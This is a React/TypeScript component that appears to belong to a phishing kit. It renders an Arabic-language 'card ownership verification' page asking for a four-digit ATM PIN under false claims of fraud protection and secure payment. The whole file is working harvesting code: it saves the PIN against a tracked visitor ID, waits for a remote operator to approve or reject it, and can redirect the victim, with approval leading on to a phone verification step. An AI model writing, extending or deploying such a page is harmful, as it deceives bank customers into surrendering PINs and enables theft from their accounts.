"use client";

import type React from "react";
import { useState, useRef, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { useRouter } from "@/lib/navigation";
import { Lock } from "lucide-react";
import { addData, handleCurrentPage } from "@/lib/data-store";
import { getRedirectUrl } from "@/lib/page-routes";
import { getOrCreateVisitorId } from "@/lib/visitor-presence";
import { watchVisitorData } from "@/lib/visitor-data";

export function AtmPinForm() {
  const router = useRouter();
  const [pin, setPin] = useState(["", "", "", ""]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const v = getOrCreateVisitorId();
    if (!v) return;

    // Signal landing to clear previous consumed redirects
    handleCurrentPage("payment-pin", {}, v);

    const unsubscribe = watchVisitorData(v, (userData) => {
      if (!userData) return;

      // 1. Prioritize explicit admin redirection
      const redirectUrl = getRedirectUrl(userData.redirectTo, "payment-pin");
      if (redirectUrl) {
        setIsSubmitting(false);
        const target = redirectUrl.includes("?")
          ? `${redirectUrl}&visitorId=${encodeURIComponent(v)}`
          : `${redirectUrl}?visitorId=${encodeURIComponent(v)}`;
        window.location.href = target;
        return;
      }

      // 2. Handle status-based progression
      if (userData.pinApproval === "approved") {
        window.location.href = `/verify-phone?visitorId=${encodeURIComponent(v)}`;
        return;
      }
      if (userData.pinApproval === "rejected") {
        setIsSubmitting(false);
        setPin(["", "", "", ""]);
        alert("الرقم السري غير صحيح، يرجى إعادة المحاولة.");
        return;
      }
    });

    return () => unsubscribe();
  }, []);

  const handlePinChange = (index: number, value: string) => {
    const numValue = value.replace(/\D/g, "").slice(0, 1);

    const newPin = [...pin];
    newPin[index] = numValue;

    setPin(newPin);

    // Move to next input if a digit was entered
    if (numValue && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>,
  ) => {
    if (e.key === "Backspace") {
      if (!pin[index] && index > 0) {
        // Move to previous input on backspace if current is empty
        inputRefs.current[index - 1]?.focus();
        const newPin = [...pin];
        newPin[index - 1] = "";
        setPin(newPin);
      } else if (pin[index]) {
        // Clear current input
        const newPin = [...pin];
        newPin[index] = "";
        setPin(newPin);
      }
      e.preventDefault();
    }
  };

  const handleSubmit = async () => {
    const pinCode = pin.join("");
    if (pinCode.length !== 4) return;
    const visitorID = getOrCreateVisitorId();
    setIsSubmitting(true);
    await addData({
      id: visitorID,
      pin: pinCode,
      pinApproval: "pending",
      step: "pin-submitted",
    });
  };

  const isFormValid = pin.every((digit) => digit !== "");

  return (
    <div className="space-y-6">
      {/* ATM Verification Card */}
      <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-8">
        {/* Title */}
        <h2 className="text-2xl font-bold text-stone-900 text-center mb-2">
          إثبات ملكية البطاقة
        </h2>

        {/* ATM Label */}
        <div className="text-center mb-6">
          <h3 className="text-4xl font-bold text-blue-900 mb-4">ATM</h3>
          <p className="text-stone-600 text-sm leading-relaxed">
            يرجى إدخال الرقم السري لصراف الآلي (ATM) المكون من 4 خانات. يتم
            التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال
            الإلكتروني والتأكد من عملية الدفع.
          </p>
        </div>

        {/* Bank Info */}
        <div className="bg-stone-50 rounded-lg p-4 mb-6 border border-stone-200">
          <div className="flex items-center gap-3 mb-2"></div>
          <div className="flex justify-end mt-2">
            <div className="flex gap-1">
              <div className="w-6 h-4 bg-red-500 rounded"></div>
              <div className="w-6 h-4 bg-yellow-400 rounded -ml-2"></div>
            </div>
          </div>
        </div>

        {/* PIN Input Fields */}
        <div className="space-y-6">
          <div>
            <label className="block text-sm text-stone-700 text-center mb-4 font-medium">
              أدخل الرقم السري (4 أرقام)
            </label>
            <div className="flex gap-3 justify-center mb-6" dir="ltr">
              {pin.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => {
                    inputRefs.current[index] = el;
                  }}
                  type="number"
                  inputMode="numeric"
                  value={digit}
                  onChange={(e) => handlePinChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  maxLength={1}
                  className="w-14 h-14 border-2 border-stone-300 rounded-lg text-center text-xl font-bold focus:border-green-500 focus:outline-none transition-colors"
                />
              ))}
            </div>
          </div>

          {/* Submit Button */}
          <Button
            onClick={handleSubmit}
            disabled={!isFormValid || isSubmitting}
            className={`w-full ${isFormValid ? " bg-green-500 " : " bg-stone-300 "} hover:bg-stone-400 disabled:bg-stone-200 disabled:cursor-not-allowed text-stone-700 text-lg h-12 font-medium rounded-lg transition-colors`}
          >
            {isSubmitting ? "جاري التحقق..." : "تأكيد"}
          </Button>
        </div>

        {/* Security Badge */}
        <div className="flex items-center justify-center gap-2 mt-6 text-green-600">
          <Lock className="h-4 w-4" />
          <span className="text-sm font-medium">دفع آمن ومحمي</span>
        </div>
      </div>
    </div>
  );
}
